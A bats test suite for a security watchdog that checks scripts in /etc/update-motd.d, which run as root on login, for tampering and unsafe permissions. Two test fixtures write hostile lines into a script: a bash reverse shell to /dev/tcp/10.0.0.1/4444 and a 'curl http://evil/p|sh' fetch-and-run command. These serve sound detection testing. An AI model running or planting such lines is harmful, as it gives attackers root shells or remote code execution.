#!/usr/bin/env bats
# L2 bats functional tests for the motd-scripts-watchdog scan script.
#
# pam_motd runs the scripts in /etc/update-motd.d AS ROOT on every
# interactive login to build the dynamic message-of-the-day — a per-login
# root-exec surface. A planted script that is world-writable / non-root-
# owned, or contains a command-injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-motd-scripts-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/motd-scripts-watchdog/systemd/motd-scripts-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/update-motd.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_MOTD_PROFILE="${PROFILE:-report}" \
    SELFDEF_MOTD_BASELINE="${BASELINE}" \
    SELFDEF_MOTD_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# 00-header\nuname -snrvm\n' > "${HOOKD}/00-header"
}

@test "no motd dir → ok / no_motd_dir" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_motd_dir"'
    cap | grep -q '"severity":"ok"'
}

@test "benign motd script, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged motd scripts on second run → ok / motd_scripts_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"motd_scripts_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a motd script with an injection pattern → alert / motd_scripts_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"motd_scripts_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable motd script → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign motd script change → warn / motd_scripts_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# 00-header updated\nuname -a\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"motd_scripts_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned motd script is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious motd script" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
